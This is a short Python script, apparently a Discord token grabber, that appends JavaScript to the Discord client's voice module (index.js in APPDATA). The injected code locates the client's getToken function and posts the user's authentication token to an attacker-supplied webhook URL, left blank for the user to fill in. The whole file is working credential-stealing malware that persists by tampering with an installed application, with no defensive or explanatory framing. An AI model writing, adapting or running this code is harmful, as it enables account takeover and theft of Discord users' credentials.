import os

# your webhook URL
WEBHOOK_URL = ""

roaming = os.getenv('APPDATA')
with open(roaming + "\\Discord\\0.0.306\\modules\\discord_voice\\index.js", "a") as file_object:
  file_object.write('\nfunction Send(token){const headers = new Headers();headers.append("Content-Type", "application/json");const body = {"content": token};const options = {method: "POST",headers,mode: "cors",body: JSON.stringify(body),};fetch("' + WEBHOOK_URL + '", options)};function GetState2(){var req=webpackJsonp.push([[],{extra_id:(e,r,t)=>e.exports=t},[["extra_id"]]]);for(const e in req.c)if(req.c.hasOwnProperty(e)){const r=req.c[e].exports;if(r&&r.__esModule&&r.default){for(const e in r.default){"getToken"===e&&Send(r.default.getToken());};};};};GetState2();')
